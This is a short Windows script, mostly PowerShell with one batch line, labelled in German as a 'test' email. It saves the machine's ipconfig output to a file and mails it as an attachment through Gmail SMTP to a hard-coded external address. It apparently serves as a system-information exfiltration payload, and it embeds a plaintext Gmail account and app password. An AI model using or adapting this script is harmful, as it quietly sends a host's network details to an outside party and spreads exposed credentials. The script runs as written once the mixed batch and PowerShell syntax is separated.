echo. > output.txt
ipconfig >> output.txt

$SMTPServer = "smtp.gmail.com"
$SMTPPort = "587"

$Username = "osmanharald5@gmail.com"
$Password = "ovsbxveiojwtoncn"

$From = "osmanharald5@gmail.com"
$To = "osmanharald5@gmail.com"
$Subject = "Test E-Mail mit Anhang (output.txt)"
$Body = "Hallo, dies ist eine automatisch gesendete E-Mail mit dem Anhang output.txt."

$SMTPClient = New-Object Net.Mail.SmtpClient($SMTPServer, $SMTPPort)
$SMTPClient.EnableSsl = $true
$SMTPClient.Credentials = New-Object System.Net.NetworkCredential($Username, $Password)

$MailMessage = New-Object Net.Mail.MailMessage($From, $To, $Subject, $Body)

$Attachment = New-Object Net.Mail.Attachment("output.txt")
$MailMessage.Attachments.Add($Attachment)

$SMTPClient.Send($MailMessage)

Write-Output "E-Mail erfolgreich mit Anhang versendet!"

$Attachment.Dispose()
